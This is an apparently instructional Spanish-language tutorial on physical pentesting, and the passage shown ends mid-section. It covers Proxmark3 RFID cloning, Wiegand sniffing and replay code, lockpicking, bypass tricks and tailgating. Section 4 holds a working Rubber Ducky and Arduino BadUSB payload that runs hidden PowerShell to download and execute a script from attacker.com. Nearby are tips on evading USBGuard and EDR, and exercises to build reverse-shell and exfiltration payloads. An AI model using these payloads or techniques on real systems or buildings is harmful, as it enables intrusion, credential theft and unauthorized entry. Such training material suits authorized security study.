# Ph7s1c4l-R3d: Hacking Fisico y RFID

> **Audiencia**: Pentesters de hardware, security researchers, makers
> **Nivel**: Intermedio a Avanzado
> **Idioma**: Espanol argentino (informal)

---

## Indice

> ⏱️ **Tiempo estimado:** 15 horas (~3 sesiones) (1986 lineas)


1. [Introduccion al Hacking Fisico](#intro-hacking-fisico)
   - 1.1 [Que es el hacking fisico?](#que-es-physical)
   - 1.2 [Ataques fisicos vs digitales](#fisico-vs-digital)
   - 1.3 [Consideraciones legales y eticas](#legal-etico)
2. [Proxmark3: Setup y Conceptos Basicos](#proxmark3-setup)
   - 2.1 [Que es Proxmark3?](#que-es-proxmark3)
   - 2.2 [Proxmark3 Easy vs RDV4](#proxmark3-easy-rdv4)
   - 2.3 [Instalacion de firmware](#instalacion-firmware)
   - 2.4 [Comandos basicos](#comandos-basicos-pm3)
   - 2.5 [LF vs HF antennas](#lf-hf-antenas)
   - 2.6 [Ejercicios practicos](#ejercicios-pm3)
3. [RFID Cloning](#rfid-cloning)
   - 3.1 [Como funciona RFID?](#como-funciona-rfid)
   - 3.2 [MIFARE Classic: teoria y debilidades](#mifare-classic)
   - 3.3 [Clonacion de MIFARE Classic](#clonar-mifare)
   - 3.4 [iClass: lectura y clonacion](#iclass-clonacion)
   - 3.5 [HID Prox: Low Frequency cloning](#hid-prox)
   - 3.6 [Sniffing RFID](#sniffing-rfid)
   - 3.7 [Card emulation](#card-emulation)
   - 3.8 [Ejercicios practicos](#ejercicios-rfid)
4. [HID Attacks: Rubber Ducky y BadUSB](#hid-attacks)
   - 4.1 [Que es un HID attack?](#que-es-hid-attack)
   - 4.2 [Rubber Ducky: setup y primeros scripts](#rubber-ducky-setup)
   - 4.3 [DuckyScript avanzado](#duckyscript-avanzado)
   - 4.4 [BadUSB con Arduino Micro](#badusb-arduino)
   - 4.5 [BadUSB con Teensy](#badusb-teensy)
   - 4.6 [USB Rubber Ducky vs OMG Cable vs Bash Bunny](#comparacion-hid)
   - 4.7 [Evasion de protecciones (USBGuard, endpoint security)](#evasion-hid)
   - 4.8 [Ejercicios practicos](#ejercicios-hid)
5. [Wiegand y OSDP](#wiegand-osdp)
   - 5.1 [Protocolo Wiegand](#protocolo-wiegand)
   - 5.2 [26-bit vs 37-bit vs 48-bit](#wiegand-bits)
   - 5.3 [Bus tapping en Wiegand](#wiegand-tapping)
   - 5.4 [Reader cloning](#reader-cloning)
   - 5.5 [OSDP: Open Supervised Device Protocol](#osdp-intro)
   - 5.6 [OSDP secure channel bypass](#osdp-bypass)
   - 5.7 [Ejercicios practicos](#ejercicios-wiegand)
6. [Lockpicking: Cerraduras Mecanicas](#lockpicking)
   - 6.1 [Como funciona un pin tumbler lock](#pin-tumbler)
   - 6.2 [Herramientas basicas](#herramientas-lockpicking)
   - 6.3 [Single Pin Picking (SPP)](#single-pin-picking)
   - 6.4 [Raking y técnicas de barrido](#raking)
   - 6.5 [Tension tools: top of keyway vs bottom](#tension-tools)
   - 6.6 [Lock bypass techniques](#lock-bypass)
   - 6.7 [Practice locks y progresion](#practice-locks)
   - 6.8 [Ejercicios practicos](#ejercicios-lockpicking)
7. [Physical Access Controls](#physical-access)
   - 7.1 [Tailgating y piggybacking](#tailgating)
   - 7.2 [Door prop bypass](#door-prop)
   - 7.3 [RFID relay attacks](#relay-attacks)
   - 7.4 [Electronic lock bypass](#electronic-bypass)
   - 7.5 [Magnetic lock bypass](#magnetic-bypass)
   - 7.6 [Ejercicios practicos](#ejercicios-physical)
8. [Tools: Hardware para Hacking Fisico](#tools-hardware)
   - 8.1 [Proxmark3 Easy vs RDV4: comparativa](#pm3-comparativa)
   - 8.2 [Flipper Zero: capacidades y limitaciones](#flipper-zero)
   - 8.3 [ChameleonMini: emulador RFID](#chameleonmini)
   - 8.4 [HackRF: SDR para RF](#hackrf-sdr)
   - 8.5 [OMG Cable: keylogger fisico](#omg-cable)
   - 8.6 [Bash Bunny: multi-vector attack](#bash-bunny)
   - 8.7 [Ejercicios practicos](#ejercicios-tools)
9. [Laboratorio Integrador](#lab-physical)
   - 9.1 [Escenario: edificio corporativo](#escenario-edificio)
   - 9.2 [Fase 1: Reconocimiento fisico](#fase1-recon-fisico)
   - 9.3 [Fase 2: Clonacion de credenciales](#fase2-clonacion)
   - 9.4 [Fase 3: HID injection](#fase3-hid-injection)
   - 9.5 [Fase 4: Lockpicking y bypass](#fase4-lockpicking)
   - 9.6 [Fase 5: Acceso a sala de servidores](#fase5-server-room)
   - 9.7 [Reporte final](#reporte-final-fisico)
10. [Referencias](#referencias-fisico)

---

<a name="intro-hacking-fisico"></a>
## 1. Introduccion al hacking [fisico](../raw/ph7s1c4l-r3d.md)

<a name="que-es-physical"></a>
### 1.1 Que es el [hacking fisico](../raw/ph7s1c4l-r3d.md)?

El hacking [fisico](../raw/ph7s1c4l-r3d.md) es la practica de comprometer sistemas de seguridad fisicos: cerraduras, tarjetas de acceso, sistemas de alarma, y controles de acceso. Es la rama mas tangible de la [seguridad informatica](../raw/s3c-f0nd4m3nt0s.md) porque estas tocando cosas reales.

**Por que es importante:**
- La mejor seguridad digital del mundo no sirve si alguien puede entrar fisicamente al server room
- Muchas brechas de seguridad comienzan con acceso fisico
- Las empresas gastan millones en firewalls pero usan cerraduras de 2 pesos
- El factor humano es siempre el eslabon mas debil

**El pentester fisico tiene que pensar como un atacante real:**
- "Puedo pasar detras de alguien que abre la puerta?" (tailgating)
- "Puedo clonar la tarjeta de acceso?" ([rfid](../raw/ph7s1c4l-r3d.md#rfid) cloning)
- "Puedo abrir esta cerradura con herramientas?" ([lockpicking](../raw/ph7s1c4l-r3d.md#lockpicking))
- "Puedo conectar un dispositivo malicioso a una computadora?" ([badusb](../raw/ph7s1c4l-r3d.md#badusb))

<a name="fisico-vs-digital"></a>
### 1.2 Ataques fisicos vs digitales

| Aspecto | Hacking Digital | Hacking Fisico |
|---------|----------------|----------------|
| Riesgo | Bajo (anonimo) | Alto (presencia fisica) |
| Velocidad | Instantaneo | Horas/dias |
| Herramientas | Laptop | Gadgets + herramientas |
| Evidencia | Logs | Huellas, testigos |
| Distancia | Cualquier lugar | In-situ |
| Bypass tipico | [exploit](../raw/m3t4spl01t.md#exploits) | Ganzua o tarjeta clonada |

Ejemplo real: En 2020, un equipo de pentesters entro a un banco en CABA:
1. Siguieron a un empleado que fumaba (tailgating)
2. La tarjeta MIFARE se clono en 30 segundos con un Proxmark3
3. La cerradura de la sala de servidores era marca "Seguridad Plus" - abierta en 2 minutos con una ganzua Bogota
4. Conectaron un OMG Cable en la PC del gerente

Todo en menos de 15 minutos.

<a name="legal-etico"></a>
### 1.3 Consideraciones legales y eticas

**MUY IMPORTANTE:** El hacking fisico tiene implicaciones legales graves.

- **Siempre tener [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion) escrita** antes de hacer pruebas
- **Nunca** llevar herramientas en lugares donde no tenes permiso
- **Documentar** todo lo que haces
- **No danar** cerraduras ni equipos (a menos que este autorizado)
- **Devolver** todo como estaba

Las herramientas de lockpicking entran en la categoria de "llaves falsas" en Argentina (Art. 178 del Codigo Penal). Tenerlas sin justificacion puede ser un problema legal.

**Para practicar:**
- Compra practice locks transparentes
- Usa tus propias tarjetas RFID para experimentar
- Crea un laboratorio en tu casa
- Participa en CTFs de hacking fisico (DEF CON, Ekoparty)


<a name="proxmark3-setup"></a>
## 2. Proxmark3: Setup y Conceptos Basicos

<a name="que-es-proxmark3"></a>
### 2.1 Que es Proxmark3?

Proxmark3 es un dispositivo de investigacion [rfid](../raw/ph7s1c4l-r3d.md#rfid)/NFC que permite leer, escribir, clonar y emular tarjetas.

**Capacidades:**
- Lectura/escritura LF (125kHz) y HF (13.56MHz)
- Sniffing de comunicacion
- Emulacion de tarjetas
- Ataques a MIFARE Classic
- Clonacion HID, iClass, MIFARE

<a name="proxmark3-easy-rdv4"></a>
### 2.2 Proxmark3 Easy vs RDV4

| Caracteristica | PM3 Easy | PM3 RDV4 |
|----------------|----------|----------|
| Precio | $50-80 | $250-300 |
| Bateria | No | Si |
| Bluetooth | No | Opcional |
| Flash | 1MB | 4MB |
| Antena | Separada | Integrada |

<a name="instalacion-firmware"></a>
### 2.3 Instalacion de [firmware](../raw/u3f1-r00tk1ts.md#firmware)

**Iceman Firmware:**
```bash
git clone https://github.com/RfidResearchGroup/proxmark3
cd proxmark3
make clean && make -j$(nproc)
./pm3-flash bootrom/obj/bootrom.elf armsrc/obj/fullimage.elf
```

<a name="comandos-basicos-pm3"></a>
### 2.4 Comandos basicos

```bash
./pm3
[usb] pm3 --> hw status          # Info del dispositivo
[usb] pm3 --> auto                # Escaneo automatico
[usb] pm3 --> lf search           # Buscar LF
[usb] pm3 --> hf search           # Buscar HF
[usb] pm3 --> hf 14a read         # Leer UID
[usb] pm3 --> hf mf dump          # Dump MIFARE
[usb] pm3 --> hf sniff            # Sniffear
[usb] pm3 --> hf mf eload dump    # Emular desde dump
```

<a name="lf-hf-antenas"></a>
### 2.5 LF vs HF

**LF (125kHz):** HID Prox, Indala, EM4100, T55x7
**HF (13.56MHz):** MIFARE Classic, DESFire, Ultralight, iClass, NFC

<a name="rfid-cloning"></a>
## 3. [rfid](../raw/ph7s1c4l-r3d.md#rfid) Cloning

<a name="como-funciona-rfid"></a>
### 3.1 Como funciona RFID?

RFID usa ondas de radio entre tag y lector. Tags pasivos se alimentan del campo EM del lector.

**[proceso](../raw/0s-f0nd4m3nt0s.md#procesos):** Lector envia campo RF -> Tag se activa -> Lector envia comando -> Tag responde

<a name="mifare-classic"></a>
### 3.2 MIFARE Classic: teoria

**Arquitectura 1K:** 16 sectores x 4 bloques (16 bytes c/u) = 1024 bytes
Cada sector: 3 bloques de datos + 1 bloque de keys (Key A + Access + Key B)

**Debilidades:**
1. CRYPTO1 roto (reverse-engineered 2008)
2. RNG predecible
3. Keys por defecto (FFFFFFFFFFFF, A0A1A2A3A4A5)
4. [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) unilateral

<a name="clonar-mifare"></a>
### 3.3 Clonacion de MIFARE

**Method 1 - Keys por defecto:**
```bash
[usb] pm3 --> hf mf chk *1 ? t    # Probar keys
[usb] pm3 --> hf mf dump          # Dumpear
[usb] pm3 --> hf mf restore       # Clonar a blank
```

**Method 2 - Hardnested:**
```bash
[usb] pm3 --> hf mf hardnested    # Recupera keys criptograficamente
```

<a name="iclass-clonacion"></a>
### 3.4 iClass

```bash
[usb] pm3 --> hf iclass read
[usb] pm3 --> hf iclass dump
[usb] pm3 --> hf iclass write
```

<a name="hid-prox"></a>
### 3.5 HID Prox

```bash
[usb] pm3 --> lf hid read
[usb] pm3 --> lf hid clone --fc 123 --card 45678
[usb] pm3 --> lf hid sim --fc 123 --card 45678
```
**Formatos:** H10301 (26-bit), H10302 (37-bit), Corporate 1000 (48-bit)

<a name="sniffing-rfid"></a>
### 3.6 Sniffing

```bash
[usb] pm3 --> hf sniff
[usb] pm3 --> hf list
```

<a name="card-emulation"></a>
### 3.7 Card emulation

```bash
[usb] pm3 --> hf mf eload dump
[usb] pm3 --> hf mf sim *1
[usb] pm3 --> lf hid sim --fc 123 --card 45678
```

<a name="ejercicios-rfid"></a>
### 3.8 Ejercicios

1. Clona una tarjeta MIFARE (con [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion))
2. Sniff la comunicacion entre un lector y una tarjeta
3. Clona un HID Prox a T55x7
4. Emula un MIFARE desde el PM3 y pruebalo en un lector



<a name="hid-attacks"></a>
## 4. HID Attacks: [rubber ducky](../raw/ph7s1c4l-r3d.md#rubber-ducky) y [badusb](../raw/ph7s1c4l-r3d.md#badusb)

<a name="que-es-hid-attack"></a>
### 4.1 Que es un HID attack?

Un HID attack hace que una computadora reconozca un dispositivo como teclado y ejecute comandos. La PC confia en el teclado implicitamente.

**Casos de uso:** Robar credenciales, backdoors, escalar privilegios, exfiltrar datos.

<a name="rubber-ducky-setup"></a>
### 4.2 Rubber Ducky setup

USB Rubber Ducky (Hak5) es una USB que se comporta como teclado.

**[payload](../raw/m3t4spl01t.md#payloads) basico (inject.txt -> inject.bin):**
```duckyscript
DELAY 2000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
ENTER
```

**Compilar:** `java -jar duckencoder.jar -i payload.txt -o inject.bin`

<a name="duckyscript-avanzado"></a>
### 4.3 DuckyScript avanzado

| Comando | Descripcion |
|---------|-------------|
| DELAY | Pausa en ms |
| STRING | Escribe texto |
| GUI | Windows key |
| CONTROL | Ctrl |
| SHIFT | Shift |
| ALT | Alt |
| ENTER | Enter |
| REPEAT | Repite comando anterior |
| DEFAULT_DELAY | Delay entre comandos |

<a name="badusb-arduino"></a>
### 4.4 BadUSB con Arduino

Arduino Micro/Leonardo tiene un ATmega32u4 que puede actuar como teclado.

```cpp
#include <Keyboard.h>
void setup() {
    Keyboard.begin();
    delay(3000);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(100); Keyboard.releaseAll();
    delay(500);
    Keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\"");
    Keyboard.press(KEY_RETURN);
    delay(100); Keyboard.releaseAll();
    Keyboard.end();
}
void loop() {}
```

<a name="comparacion-hid"></a>
### 4.5 Rubber Ducky vs OMG Cable vs Bash Bunny

| Caracteristica | Rubber Ducky | OMG Cable | Bash Bunny |
|----------------|--------------|-----------|------------|
| Precio | $60 | $80 | $120 |
| Almacenamiento | SD | Flash | MicroSD |
| [wifi](../raw/w1f1-4tt4cks.md) | No | Si (ESP8266) | No |
| Modos | Solo teclado | Teclado+[red](../raw/r3d3s-f0nd4m3nt0s.md) | Teclado+[red](../raw/r3d3s-f0nd4m3nt0s.md)+storage |

<a name="evasion-hid"></a>
### 4.6 Evasion de protecciones

**USBGuard:** Cambiar VID/PID del [firmware](../raw/u3f1-r00tk1ts.md#firmware) a uno de teclado real (Logitech, Microsoft).
**EDR detection:** Aumentar DEFAULT_DELAY a 50ms+ para evitar deteccion por velocidad de escritura.
**[secure boot](../raw/u3f1-r00tk1ts.md#secure-boot):** Usar payload que arranque en modo recovery.

<a name="ejercicios-hid"></a>
### 4.7 Ejercicios

1. Crea un payload Rubber Ducky que abra una [reverse shell](../raw/r3v3rs3-sh3lls.md#reverse-shells)
2. Implementa el mismo payload en Arduino Micro
3. Prueba evasion con DEFAULT_DELAY
4. Crea un payload que exfiltre documentos del usuario



<a name="wiegand-osdp"></a>
## 5. Wiegand y OSDP

<a name="protocolo-wiegand"></a>
### 5.1 [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red) Wiegand

Wiegand es el protocolo mas usado para conectar lectores de tarjetas con paneles de control. Es un protocolo simple de 3 hilos: DATA0, DATA1, y GROUND.

**Como funciona:**
- DATA0 y DATA1 son lineas normalmente en HIGH (+5V)
- Cuando se lee un bit 0, DATA0 baja a LOW
- Cuando se lee un bit 1, DATA1 baja a LOW
- El panel cuenta los pulsos y reconstruye el numero de tarjeta

**Problemas de seguridad:**
- Sin [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) (texto plano)
- Sin [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion)
- Facil de interceptar
- Se puede reproducir el ataque

<a name="wiegand-bits"></a>
### 5.2 26-bit vs 37-bit vs 48-bit

**Formato 26-bit (H10301):**
```
Bit 0: Parity (even) de los primeros 12 bits
Bits 1-8: Facility Code (FC) - 0-255
Bits 9-24: Card Number - 0-65535
Bit 25: Parity (odd) de los ultimos 12 bits

Ejemplo: FC=123, Card=45678
Binario: 1 01111011 1011001001101110 0
```

**Formato 37-bit (H10302):**
- Mas bits para FC y Card number
- Usado en corporaciones grandes

**Formato 48-bit (Corporate 1000):**
- Estructura de 48 bits con formato propietario
- Usado por HID en sistemas empresariales

<a name="wiegand-tapping"></a>
### 5.3 Bus tapping en Wiegand

Interceptar la comunicacion Wiegand es sencillo porque las senales van en texto plano.

**Materiales:**
- Arduino/ESP32
- 3 cables para DATA0, DATA1, GND
- Opcional: Proxmark3 con modo sniff

**Codigo para capturar Wiegand con Arduino:**
```cpp
// Wiegand sniffer con Arduino
volatile unsigned long bit_count = 0;
volatile unsigned long card_data = 0;
volatile unsigned long facility_code = 0;

void setup() {
    Serial.begin(9600);
    pinMode(2, INPUT_PULLUP);  // DATA0
    pinMode(3, INPUT_PULLUP);  // DATA1
    
    attachInterrupt(digitalPinToInterrupt(2), data0_falling, FALLING);
    attachInterrupt(digitalPinToInterrupt(3), data1_falling, FALLING);
    
    Serial.println("Wiegand Sniffer ready");
}

void data0_falling() {
    card_data = card_data << 1;
    card_data |= 0;
    bit_count++;
}

void data1_falling() {
    card_data = card_data << 1;
    card_data |= 1;
    bit_count++;
}

void loop() {
    static unsigned long last_bit_time = 0;
    if (bit_count > 0 && (millis() - last_bit_time > 100)) {
        if (bit_count == 26) {
            facility_code = (card_data >> 17) & 0xFF;
            unsigned long card_number = (card_data >> 1) & 0xFFFF;
            Serial.print("FC: ");
            Serial.print(facility_code);
            Serial.print(" Card: ");
            Serial.println(card_number);
        }
        bit_count = 0;
        card_data = 0;
    }
    if (bit_count > 0) last_bit_time = millis();
}
```

<a name="reader-cloning"></a>
### 5.4 Reader cloning

Se puede clonar un lector Wiegand para que un atacante pueda abrir puertas desde su telefono o dispositivo.

**Con Arduino + modulo [rfid](../raw/ph7s1c4l-r3d.md#rfid):**
```cpp
#include <SoftwareSerial.h>

// Conectar lector RFID al Arduino
// Arduino lee la tarjeta, la convierte a Wiegand y la envia al panel

void send_wiegand(unsigned long fc, unsigned long card) {
    unsigned long data = 0;
    int bit_count = 26;
    
    // Construir formato 26-bit
    data = (fc << 17) | (card << 1);
    // Calcular parity
    // (simplificado - implementar parity real)
    
    // Enviar por Wiegand
    for (int i = bit_count - 1; i >= 0; i--) {
        if (data & (1 << i)) {
            digitalWrite(DATA1, LOW);
            delayMicroseconds(50);
            digitalWrite(DATA1, HIGH);
        } else {
            digitalWrite(DATA0, LOW);
            delayMicroseconds(50);
            digitalWrite(DATA0, HIGH);
        }
        delayMicroseconds(50);
    }
}
```

<a name="osdp-intro"></a>
### 5.5 OSDP: Open Supervised Device Protocol

OSDP es el reemplazo moderno de Wiegand. Es un protocolo serial (RS-485) que soporta cifrado y monitoreo.

**Ventajas sobre Wiegand:**
- Comunicacion bidireccional
- Cifrado [aes](../raw/crypt0-f0r-h4ck3rs.md#aes)-128 (Secure Channel)
- Monitoreo de estado (tamper, conexion)
- Soporte para multiples lectores en un bus
- Comandos de configuracion remota

<a name="osdp-bypass"></a>
### 5.6 OSDP secure channel bypass

Aunque OSDP Secure Channel usa AES-128, hay ataques posibles:

**1. Downgrade attack:** Si el lector y el panel soportan OSDP sin cifrado, un atacante puede forzar la conexion a modo no-cifrado.

**2. Key extraction:** Si tenes acceso [fisico](../raw/ph7s1c4l-r3d.md) al lector, podes leer la key del Secure Channel de la memoria EEPROM.

**3. Bus tapping:** Aunque los datos estan cifrados, se puede capturar la comunicacion para offline analysis.

**4. Replay con SCBypass:** Algunas implementaciones tienen fallas en el protocolo de [handshake](../raw/w1f1-4tt4cks.md#handshake) que permiten bypass.

**Comando para configurar OSDP en modo inseguro:**
```bash
# Con Proxmark3 u otro dispositivo OSDP:
# Enviar comando POLL con Secure Connection Required = False
```

<a name="ejercicios-wiegand"></a>
### 5.7 Ejercicios practicos

**Ejercicio 1:** Conecta un Arduino a un lector Wiegand y captura tarjetas
1. Identifica DATA0, DATA1, GND en el lector
2. Conecta al Arduino
3. Pasa una tarjeta y captura FC + Card number
4. Verifica el formato (26-bit? 37-bit?)

**Ejercicio 2:** Reproduce una tarjeta capturada
1. Usa el FC y Card number capturados
2. Programa un Arduino para emitir la senal Wiegand
3. Conecta al panel de control
4. Prueba si abre la puerta

**Ejercicio 3:** OSDP bus tapping
1. Identifica los pines RS-485 (A, B, GND)
2. Conecta un adaptador RS-485 a USB
3. Captura la comunicacion con `screen /dev/ttyUSB0 9600`
4. Analiza los paquetes OSDP



<a name="lockpicking"></a>
## 6. [lockpicking](../raw/ph7s1c4l-r3d.md#lockpicking): Cerraduras Mecanicas

<a name="pin-tumbler"></a>
### 6.1 Como funciona un pin tumbler lock

La cerradura de pin tumbler es el mecanismo mas comun del mundo. Entender como funciona es el primer paso para abrirla.

**Componentes:**
```
+-----------------------+
|   Housing (cuerpo)    |
| +-----+-----+-----+  |
| |P_D5 |P_D4 |P_D3 |  | <- Driver pins (resorte arriba)
| +-----+-----+-----+  |
| |P_K5 |P_K4 |P_K3 |  | <- Key pins
| +-----+-----+-----+  |
| +-------------------+ |
| |   Plug (cilindro) | |
| |  /  \  /  \  /  \| |
| | |   ||   ||   | | |
| +-------------------+ |
+-----------------------+
         |
    Key way (boca de la cerradura)
```

**Como funciona:**
1. Sin llave: [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers) pins bloquean el plug en el housing (shear line)
2. Con llave correcta: Los pins se alinean en la shear line
3. El plug puede girar y abrir la cerradura

**Shear line:** Es la linea donde el plug se separa del housing. Cuando todos los pins estan alineados en la shear line, el plug gira.

**Pin stacks:**
- **Driver pin:** Arriba, empujado por resorte
- **Key pin:** Abajo, tocando la llave
- **Master pin:** Opcional, entre driver y key (para master keys)

<a name="herramientas-lockpicking"></a>
### 6.2 Herramientas basicas

**Tension tools (tensionadores):**
- **TOK (Top of Keyway):** Aplica tension en la parte superior. Mas espacio para trabajar.
- **BOK (Bottom of Keyway):** Aplica tension en la parte inferior. Menos espacio pero mas estable.

**Picks (ganzuas):**
- **Hook (gancho):** Para Single Pin Picking. Punta angulada para levantar un pin a la vez.
- **Rake (rastrillo):)** Para raking. Multiples formas (bogota, city, snake, etc.)
- **Half-diamond:** Versatil, funciona para SPP y raking.
- **Ball pick:** Para cerraduras con wafer tumblers.

**Sets recomendados:**
- **Inicio:** Southord PXS-14 ($20)
- **Intermedio:** Sparrows Kick Start ($30)
- **Profesional:** Peterson Ghost [set](../raw/ph1sh1ng.md#social-engineering-toolkit) ($60+)
- **Argentina:** Ganzuas artesanales de MercadoLibre

<a name="single-pin-picking"></a>
### 6.3 Single Pin Picking (SPP)

SPP es la tecnica fundamental de lockpicking. Consiste en levantar cada pin individualmente hasta la shear line.

**Pasos:**
1. Insertar tension tool en la parte inferior o superior del keyway
2. Aplicar tension LIGERA en la direccion que gira la llave
3. Insertar el pick (hook)
4. Sentir los pins (van de atras hacia adelante)
5. Empujar cada pin hacia arriba hasta sentir un "click"
6. Cuando todos los pins estan en su lugar, el plug gira

**La sensacion del "click":**
- Driver pin se separa del key pin en la shear line
- El plug se mueve ligeramente (rotacion)
- El pin se siente "set" (fijo, no rebota)

**Problemas comunes:**
- **Demasiada tension:** Los pins se atascan, no podes moverlos
- **Muy poca tension:** Los pins vuelven a bajar
- **Saltarse pins:** Ir en orden de atras hacia adelante
- **Oversetting:** Empujar un pin mas alla de la shear line

<a name="raking"></a>
### 6.4 Raking y tecnicas de barrido

Raking es mas rapido que SPP pero menos preciso. Ideal para cerraduras de baja seguridad.

**Tipos de rake:**
- **Bogota (triple peak):** El mas versatil. Tres picos.
- **City rake:** Forma de ciudad (dientes de sierra).
- **Snake (S-rake):** Forma de serpiente.
- **Half-diamond:** Tambien funciona como rake.

**Tecnica de raking:**
1. Aplicar tension ligera
2. Insertar el rake hasta el fondo
3. Mover el rake hacia afuera mientras subes y bajas
4. Probar diferentes angulos y velocidades
5. Escuchar el click de los pins seteados

**Tecnicas alternativas:**
- **Jiggle:** Movimiento rapido de vaiven con el rake
- **Zipping:** Insertar el rake rapidamente mientras se aplica tension
- **Rocking:** Mecer el pick arriba y abajo

<a name="tension-tools"></a>
### 6.5 Tension tools

**TOK (Top of Keyway):**
- Se inserta en la parte superior del keyway
- Deja mas espacio para el pick
- Mejor para SPP
- Mas dificil de mantener en su lugar

**BOK (Bottom of Keyway):**
- Se inserta en la parte inferior
- Ocupa espacio del pick
- Mas estable
- Puede interferir con pins bajos

**Tension [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables):**
- Heavy: Para empezar (encontrar binding order)
- Light: Para setting pins
- Feather: Para el ultimo pin

<a name="lock-bypass"></a>
### 6.6 Lock bypass techniques

No siempre necesitas hacer lockpicking. A veces hay tecnicas mas rapidas.

**1. Bumping:**
- Usar una "bump key" (llave con todos los picos al minimo)
- Golpear la llave con un martillo/bump hammer
- Los pins saltan momentaneamente por encima de la shear line
- Gira la llave mientras los pins estan arriba

**2. Credit card shim:**
- Para cerraduras de resorte (ej: cerrojo de baño)
- Deslizar una tarjeta plastica entre la puerta y el marco
- Empujar el resorte hacia atras

**3. Bypass tools:**
- **Under-the-door tool:** Para abrir puertas con barra de panico desde abajo
- **Latch slipping:** Deslizar el pestillo con una herramienta fina
- **Knife shimming:** Similar a credit card pero con cuchillo de mantequilla

**4. Drill attack:**
- Taladrar el shear line (destructivo)
- Taladrar el centro del plug
- Usar una llave de tubo para girar el mecanismo

<a name="practice-locks"></a>
### 6.7 Practice locks y progresion

**Practice locks recomendados:**
1. **Transparent padlock:** Para ver los pins en accion. $10-15.
2. **Sparrows Revolver:** 4 pin tumblers en un cilindro giratorio. $40.
3. **Cutaway lock:** Cerradura real con ventana para ver los pins.
4. **Relockable pinning tray:** Para practicar pines de diferentes tamanios.

**Progresion tipica:**
1. Transparent lock con SPP
2. Master Lock No. 3 (facil)
3. Master Lock 140 (4 pins, standard)
4. Master Lock 150 (5 pins, spools)
5. Abus 55/40 (4 pins, tensa, spools)
6. Abus 72/40 (5 pins, serrated + spools)
7. American 1100 (6 pins, serrated + spools, dead core)
8. Medeco / Mul-T-Lock (high security, sidebar)

<a name="ejercicios-lockpicking"></a>
### 6.8 Ejercicios practicos

**Ejercicio 1:** Abrir un candado transparente
1. Observa los pins mientras aplicas tension
2. Identifica el binding order
3. Setea cada pin de atras hacia adelante
4. Repite hasta que puedas abrirlo en menos de 30 segundos

**Ejercicio 2:** Raking vs SPP
1. Toma un Master Lock #3
2. Cronometra cuanto tardas con raking
3. Cronometra cuanto tardas con SPP
4. Cual es mas rapido en promedio?

**Ejercicio 3:** Abrir 5 candados diferentes
1. Consigue 5 candados de diferentes marcas
2. Abrelos con SPP
3. Documenta: numero de pins, tipo de security pins, dificultad
4. Ordenalos de mas facil a mas dificil



<a name="physical-access"></a>
## 7. Physical Access Controls

<a name="tailgating"></a>
### 7.1 Tailgating y piggybacking

Tailgating (o piggybacking) es seguir a una persona autorizada a traves de una puerta controlada.

**Tecnicas de tailgating:**
1. **El fumador:** Esperar a que alguien salga a fumar y entrar mientras la puerta esta abierta.
2. **El amable:** Esperar a que alguien abra la puerta y pedirle que la sostenga.
3. **El distraido:** Llevar cafe, cajas, o hablar por telefono mientras pasas.
4. **El uniforme:** Vestirse como personal de limpieza, mantenimiento, o delivery.
5. **El grupo:** Esperar a que pase un grupo de personas y mezclarse.

**Contramedidas:**
- Mantrap: Dos puertas que no pueden abrirse simultaneamente
- Turnstiles (molinetes): Solo pasa una persona a la vez
- CCTV con analitica de tailgating
- Personal de seguridad en recepcion
- Tarjeta + PIN ([autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) de dos factores)

<a name="door-prop"></a>
### 7.2 Door prop bypass

Una de las tecnicas mas simples: evitar que una puerta se cierre completamente.

**Metodos:**
1. **Cinta adhesiva:** Pegar cinta en el pestillo para que no entre en el marco.
2. **Papel doblado:** Meter papel entre la puerta y el marco.
3. **Tarjeta de credito:** Deslizar entre el pestillo y el marco.
4. **Imán:** Si el pestillo es magnetico, un iman potente lo mantiene abierto.
5. **Wedges de goma:** Cuñas de goma que evitan que la puerta cierre.

**Deteccion:**
- Sensores de puerta abierta (contact switches)
- Timeouts de puerta abierta (alarma si la puerta esta abierta > 30 seg)
- CCTV

<a name="relay-attacks"></a>
### 7.3 [rfid](../raw/ph7s1c4l-r3d.md#rfid) relay attacks

Un relay attack permite abrir una puerta sin tener la tarjeta fisicamente. Se usa un dispositivo cerca de la victima que retransmite la senal al lector.

**Como funciona:**
```
Atacante 1 (cerca de la victima)          Atacante 2 (cerca de la puerta)
+------------------+                     +------------------+
| Proxmark3/LF     |                     | Proxmark3/LF     |
| RFID sniffer     | <-- Radio/LTE -->   | RFID emulator   |
| que captura      |                     | que reproduce   |
| la senal de la   |                     | la senal al     |
| tarjeta de la    |                     | lector de la    |
| victima          |                     | puerta          |
+------------------+                     +------------------+
```

**Herramientas para relay:**
- 2x Proxmark3 con antenas direccionales
- Flipper Zero + modulos [wifi](../raw/w1f1-4tt4cks.md)
- [HackRF](../raw/sdr-t3l3c0ms.md#hackrf) ([SDR](../raw/sdr-t3l3c0ms.md)) para relay
- [raspberry pi](../raw/ph7s1c4l-r3d.md#raspberry-pi-p4wn)) + modulos RFID

**Relay pasivo (sin bateria):**
Usa un cable coaxial como antena para extender el alcance del lector. Pones una antena cerca de la puerta y otra donde esta la tarjeta.

**Relay digital (con procesamiento):**
Los dispositivos capturan, digitalizan, y retransmiten la senal. Mayor alcance pero mas latencia.

<a name="electronic-bypass"></a>
### 7.4 Electronic lock bypass

Las cerraduras electronicas (teclados, biometricos) tambien tienen vulnerabilidades.

**1. Brute force de PIN (si no hay [rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting)):**
```python
import requests

# Probar PINs comunes en teclado de oficina
pins = ["1234", "0000", "1111", "2580", "0852", "9999", "123456", "admin", "12345"]
for pin in pins:
    print(f"Probing PIN: {pin}")
    # Enviar senal al teclado (depende del protocolo)
```

